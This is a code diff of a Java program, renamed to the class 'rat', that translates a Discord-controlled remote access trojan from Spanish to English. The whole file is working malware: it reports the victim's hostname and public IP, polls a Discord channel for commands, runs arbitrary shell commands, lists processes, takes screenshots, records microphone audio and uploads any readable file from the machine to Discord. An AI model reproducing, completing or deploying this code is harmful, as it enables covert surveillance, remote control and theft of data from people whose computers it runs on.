@@ -30,42 +30,45 @@ import javax.sound.sampled.TargetDataLine;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-public class UwU {
-    private static final String TOKEN = "TOKEN DEL BOT";
-    private static final String CHANNEL_ID = "CANAL ID";
+public class rat {
+    private static final String TOKEN = "BOT TOKEN";
+    private static final String CHANNEL_ID = "CHANNEL ID";
     private static final String API_HOST = "discord.com";
     private static final String API_URL = "https://" + API_HOST + "/api/v10/channels/" + CHANNEL_ID + "/messages";
 
+    // list to track processed messages and avoid duplicates
     private static final List<String> processedMessageIds = new ArrayList<>();
 
     public static void main(String[] args) {
         try {
             String hostname = InetAddress.getLocalHost().getHostName();
-            String ip = obtenerIp();
-            enviarMensaje("📢 Conexion establecida desde: " + hostname + " (" + ip + ")");
+            String ip = getPublicIp();
+            sendMessage("📢 Connection established from: " + hostname + " (" + ip + ")");
 
-            JSONArray mensajesIniciales = obtenerMensajes(1);
-            if (mensajesIniciales.length() > 0) {
-                processedMessageIds.add(mensajesIniciales.getJSONObject(0).getString("id"));
+            // get initial message to avoid processing old commands
+            JSONArray initialMessages = getMessages(1);
+            if (initialMessages.length() > 0) {
+                processedMessageIds.add(initialMessages.getJSONObject(0).getString("id"));
             }
 
+            // main command listening loop
             while (true) {
-                JSONArray mensajes = obtenerMensajes(10);
-                procesarMensajes(mensajes);
+                JSONArray messages = getMessages(10);
+                processMessages(messages);
                 Thread.sleep(5000);
             }
         } catch (Exception e) {
             try {
-                enviarMensaje("❌ Error en el programa: " + e.getMessage());
+                sendMessage("❌ Program error: " + e.getMessage());
             } catch (Exception ignored) {
             }
             e.printStackTrace();
         }
     }
 
-    private static void procesarMensajes(JSONArray mensajes) throws Exception {
-        for (int i = 0; i < mensajes.length(); i++) {
-            JSONObject msg = mensajes.getJSONObject(i);
+    private static void processMessages(JSONArray messages) throws Exception {
+        for (int i = 0; i < messages.length(); i++) {
+            JSONObject msg = messages.getJSONObject(i);
             String messageId = msg.getString("id");
 
             if (processedMessageIds.contains(messageId)) {
@@ -77,93 +80,94 @@ public class UwU {
                 processedMessageIds.remove(0);
             }
 
-            String contenido = msg.getString("content").trim();
+            String content = msg.getString("content").trim();
 
-            if (contenido.startsWith("!cmd ")) {
-                String comando = contenido.substring(5);
-                enviarMensaje("🔄 Ejecutando: `" + comando + "`");
-                String salida = ejecutarComando(comando);
-                if (salida.length() > 1900) {
-                    salida = salida.substring(0, 1900) + "... (truncado)";
+            // command execution
+            if (content.startsWith("!cmd ")) {
+                String command = content.substring(5);
+                sendMessage("🔄 Executing: `" + command + "`");
+                String output = executeCommand(command);
+                if (output.length() > 1900) {
+                    output = output.substring(0, 1900) + "... (truncated)";
                 }
-                enviarMensaje("```" + salida + "```");
-            } else if (contenido.equals("!info")) {
-                enviarMensaje("ℹ️ Informacion del sistema:\n```" + obtenerInfo() + "```");
-            } else if (contenido.equals("!ip")) {
-                enviarMensaje("🌐 IP Pública: " + obtenerIp());
-            } else if (contenido.equals("!screenshot")) {
+                sendMessage("```" + output + "```");
+            } else if (content.equals("!info")) {
+                sendMessage("ℹ️ System information:\n```" + getSystemInfo() + "```");
+            } else if (content.equals("!ip")) {
+                sendMessage("🌐 Public IP: " + getPublicIp());
+            } else if (content.equals("!screenshot")) {
                 try {
-                    enviarMensaje("📸 Capturando pantalla...");
-                    byte[] imgData = capturarPantalla();
-                    enviarImagen(imgData, "screenshot.png");
+                    sendMessage("📸 Capturing screen...");
+                    byte[] imgData = captureScreen();
+                    sendImage(imgData, "screenshot.png");
                 } catch (Exception e) {
-                    enviarMensaje("❌ Error al capturar pantalla: " + e.getMessage());
+                    sendMessage("❌ Error capturing screen: " + e.getMessage());
                 }
-            } else if (contenido.equals("!exit")) {
-                enviarMensaje("🛑 Terminando programa...");
+            } else if (content.equals("!exit")) {
+                sendMessage("🛑 Terminating program...");
                 System.exit(0);
             }
-            else if (contenido.equals("!procesos")) {
-                enviarMensaje("📋 Listando procesos activos...");
-                String salida;
+            else if (content.equals("!processes")) {
+                sendMessage("📋 Listing active processes...");
+                String output;
                 if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-                    salida = ejecutarComando("tasklist");
+                    output = executeCommand("tasklist");
                 } else {
-                    salida = ejecutarComando("ps aux");
+                    output = executeCommand("ps aux");
                 }
-                if (salida.length() > 1900) {
-                    salida = salida.substring(0, 1900) + "... (truncado)";
+                if (output.length() > 1900) {
+                    output = output.substring(0, 1900) + "... (truncated)";
                 }
-                enviarMensaje("```" + salida + "```");
+                sendMessage("```" + output + "```");
             }
-            else if (contenido.startsWith("!grabar ")) {
+            else if (content.startsWith("!record ")) {
                 try {
-                    int segundos = Integer.parseInt(contenido.substring(8).trim());
-                    if (segundos > 0 && segundos <= 30) {
-                        enviarMensaje("🎤 Grabando audio durante " + segundos + " segundos...");
-                        byte[] audioData = grabarAudio(segundos);
-                        enviarArchivo(audioData, "grabacion.wav", "audio/wav");
-                        enviarMensaje("✅ Grabación completada!");
+                    int seconds = Integer.parseInt(content.substring(8).trim());
+                    if (seconds > 0 && seconds <= 30) {
+                        sendMessage("🎤 Recording audio for " + seconds + " seconds...");
+                        byte[] audioData = recordAudio(seconds);
+                        sendFile(audioData, "recording.wav", "audio/wav");
+                        sendMessage("✅ Recording completed!");
                     } else {
-                        enviarMensaje("especifica una duración entre 1 y 30 segundos");
+                        sendMessage("⚠️ Please specify a duration between 1 and 30 seconds");
                     }
                 } catch (NumberFormatException e) {
-                    enviarMensaje("⚠️ Formato incorrecto. Uso: !grabar [segundos]");
+                    sendMessage("⚠️ Incorrect format. Usage: !record [seconds]");
                 } catch (Exception e) {
-                    enviarMensaje("❌ Error al grabar audio: " + e.getMessage());
+                    sendMessage("❌ Error recording audio: " + e.getMessage());
                 }
             }
-            else if (contenido.startsWith("!descargar ")) {
-                String rutaArchivo = contenido.substring(11).trim();
+            else if (content.startsWith("!download ")) {
+                String filePath = content.substring(11).trim();
                 try {
-                    File archivo = new File(rutaArchivo);
-                    if (archivo.exists() && archivo.isFile() && archivo.canRead()) {
-                        if (archivo.length() > 8 * 1024 * 1024) {
-                            enviarMensaje("⚠️ El archivo es demasiado grande");
+                    File file = new File(filePath);
+                    if (file.exists() && file.isFile() && file.canRead()) {
+                        if (file.length() > 8 * 1024 * 1024) {
+                            sendMessage("⚠️ File is too large (max 8MB)");
                         } else {
-                            enviarMensaje("📥 Descargando archivo: " + archivo.getName() + "...");
-                            byte[] fileData = Files.readAllBytes(Paths.get(rutaArchivo));
+                            sendMessage("📥 Downloading file: " + file.getName() + "...");
+                            byte[] fileData = Files.readAllBytes(Paths.get(filePath));
 
-                            String contentType = Files.probeContentType(Paths.get(rutaArchivo));
+                            String contentType = Files.probeContentType(Paths.get(filePath));
                             if (contentType == null) {
                                 contentType = "application/octet-stream";
                             }
 
-                            enviarArchivo(fileData, archivo.getName(), contentType);
-                            enviarMensaje("✅ Archivo enviado: " + archivo.getName());
+                            sendFile(fileData, file.getName(), contentType);
+                            sendMessage("✅ File sent: " + file.getName());
                         }
                     } else {
-                        enviarMensaje("❌ No se puede acceder al archivo: " + rutaArchivo);
+                        sendMessage("❌ Cannot access file: " + filePath);
                     }
                 } catch (Exception e) {
-                    enviarMensaje("❌ Error al descargar archivo: " + e.getMessage());
+                    sendMessage("❌ Error downloading file: " + e.getMessage());
                 }
             }
         }
     }
 
-    private static JSONArray obtenerMensajes(int limite) throws IOException {
-        URL url = new URL(API_URL + "?limit=" + limite);
+    private static JSONArray getMessages(int limit) throws IOException {
+        URL url = new URL(API_URL + "?limit=" + limit);
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod("GET");
         conn.setRequestProperty("Authorization", "Bot " + TOKEN);
@@ -178,7 +182,7 @@ public class UwU {
         }
     }
 
-    private static void enviarMensaje(String contenido) throws IOException {
+    private static void sendMessage(String content) throws IOException {
         URL url = new URL(API_URL);
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod("POST");
@@ -189,7 +193,7 @@ public class UwU {
         conn.setDoOutput(true);
 
         JSONObject payload = new JSONObject();
-        payload.put("content", contenido);
+        payload.put("content", content);
 
         try (DataOutputStream os = new DataOutputStream(conn.getOutputStream())) {
             os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
@@ -200,12 +204,12 @@ public class UwU {
             try (InputStream errorStream = conn.getErrorStream();
                  Scanner scanner = new Scanner(errorStream).useDelimiter("\\A")) {
                 String errorResponse = scanner.hasNext() ? scanner.next() : "";
-                System.err.println("error al enviar mensaje: " + responseCode + " - " + errorResponse);
+                System.err.println("Error sending message: " + responseCode + " - " + errorResponse);
             }
         }
     }
 
-    private static String ejecutarComando(String cmd) throws IOException {
+    private static String executeCommand(String cmd) throws IOException {
         Process process;
         if (System.getProperty("os.name").toLowerCase().contains("windows")) {
             process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
@@ -233,32 +237,32 @@ public class UwU {
             process.waitFor();
         } catch (InterruptedException e) {
             Thread.currentThread().interrupt();
-            output.append("\nComando interrumpido.");
+            output.append("\nCommand interrupted.");
         }
 
         return output.toString();
     }
 
-    private static String obtenerInfo() {
+    private static String getSystemInfo() {
         return "OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version") + "\n" +
                 "CPU: " + System.getProperty("os.arch") + "\n" +
                 "Java: " + System.getProperty("java.version") + "\n" +
-                "Memoria libre: " + Runtime.getRuntime().freeMemory() / (1024 * 1024) + "MB\n" +
-                "Memoria total: " + Runtime.getRuntime().totalMemory() / (1024 * 1024) + "MB\n" +
+                "Free memory: " + Runtime.getRuntime().freeMemory() / (1024 * 1024) + "MB\n" +
+                "Total memory: " + Runtime.getRuntime().totalMemory() / (1024 * 1024) + "MB\n" +
                 "Hostname: " + getHostname() + "\n" +
-                "Usuario: " + System.getProperty("user.name") + "\n" +
-                "Fecha: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
+                "User: " + System.getProperty("user.name") + "\n" +
+                "Date: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
     }
 
     private static String getHostname() {
         try {
             return InetAddress.getLocalHost().getHostName();
         } catch (Exception e) {
-            return "desconocido";
+            return "unknown";
         }
     }
 
-    private static String obtenerIp() throws IOException {
+    private static String getPublicIp() throws IOException {
         URL url = new URL("https://api64.ipify.org/?format=json");
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod("GET");
@@ -273,7 +277,7 @@ public class UwU {
         }
     }
 
-    private static byte[] capturarPantalla() throws Exception {
+    private static byte[] captureScreen() throws Exception {
         Robot robot = new Robot();
         Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
         BufferedImage screenCapture = robot.createScreenCapture(screenRect);
@@ -283,27 +287,27 @@ public class UwU {
         return baos.toByteArray();
     }
 
-    private static byte[] grabarAudio(int segundos) throws Exception {
-        AudioFormat formato = new AudioFormat(44100, 16, 1, true, false);
-        DataLine.Info info = new DataLine.Info(TargetDataLine.class, formato);
+    private static byte[] recordAudio(int seconds) throws Exception {
+        AudioFormat format = new AudioFormat(44100, 16, 1, true, false);
+        DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
 
         if (!AudioSystem.isLineSupported(info)) {
-            throw new Exception("formato de augio no soportado");
+            throw new Exception("Audio format not supported");
         }
 
         TargetDataLine line = (TargetDataLine) AudioSystem.getLine(info);
-        line.open(formato);
+        line.open(format);
         line.start();
 
         ByteArrayOutputStream out = new ByteArrayOutputStream();
-        int bufferSize = (int) formato.getSampleRate() * formato.getFrameSize();
+        int bufferSize = (int) format.getSampleRate() * format.getFrameSize();
         byte[] buffer = new byte[bufferSize];
 
         try {
-            int limite = (int) (formato.getFrameRate() * segundos);
+            int limit = (int) (format.getFrameRate() * seconds);
             int total = 0;
 
-            while (total < limite) {
+            while (total < limit) {
                 int count = line.read(buffer, 0, buffer.length);
                 if (count > 0) {
                     out.write(buffer, 0, count);
@@ -313,8 +317,8 @@ public class UwU {
 
             ByteArrayOutputStream wavOut = new ByteArrayOutputStream();
 
-            writeWavHeader(wavOut, (int) formato.getSampleRate(), formato.getChannels(),
-                    (int) formato.getSampleSizeInBits(), out.size());
+            writeWavHeader(wavOut, (int) format.getSampleRate(), format.getChannels(),
+                    (int) format.getSampleSizeInBits(), out.size());
 
             out.writeTo(wavOut);
 
@@ -325,6 +329,7 @@ public class UwU {
         }
     }
 
+    // wav file header creation for audio recording
     private static void writeWavHeader(ByteArrayOutputStream out, int sampleRate, int channels,
                                        int bitsPerSample, int dataLength) throws IOException {
         out.write("RIFF".getBytes());
@@ -356,11 +361,12 @@ public class UwU {
         out.write((value >> 8) & 0xFF);
     }
 
-    private static void enviarImagen(byte[] imgData, String nombre) throws IOException {
-        enviarArchivo(imgData, nombre, "image/png");
+    private static void sendImage(byte[] imgData, String name) throws IOException {
+        sendFile(imgData, name, "image/png");
     }
 
-    private static void enviarArchivo(byte[] data, String nombre, String contentType) throws IOException {
+    // multipart file upload to dc
+    private static void sendFile(byte[] data, String name, String contentType) throws IOException {
         URL url = new URL(API_URL);
         String boundary = "----BOUNDARY" + System.currentTimeMillis();
 
@@ -375,10 +381,10 @@ public class UwU {
         try (DataOutputStream os = new DataOutputStream(conn.getOutputStream())) {
             os.writeBytes("--" + boundary + "\r\n");
             os.writeBytes("Content-Disposition: form-data; name=\"content\"\r\n\r\n");
-            os.writeBytes("📁 Archivo: " + nombre + "\r\n");
+            os.writeBytes("📁 File: " + name + "\r\n");
 
             os.writeBytes("--" + boundary + "\r\n");
-            os.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + nombre + "\"\r\n");
+            os.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + name + "\"\r\n");
             os.writeBytes("Content-Type: " + contentType + "\r\n\r\n");
 
             os.write(data);
@@ -391,7 +397,7 @@ public class UwU {
             try (InputStream errorStream = conn.getErrorStream();
                  Scanner scanner = new Scanner(errorStream).useDelimiter("\\A")) {
                 String errorResponse = scanner.hasNext() ? scanner.next() : "";
-                System.err.println("error al enviar archivo: " + responseCode + " - " + errorResponse);
+                System.err.println("Error: " + responseCode + " - " + errorResponse);
             }
         }
     }
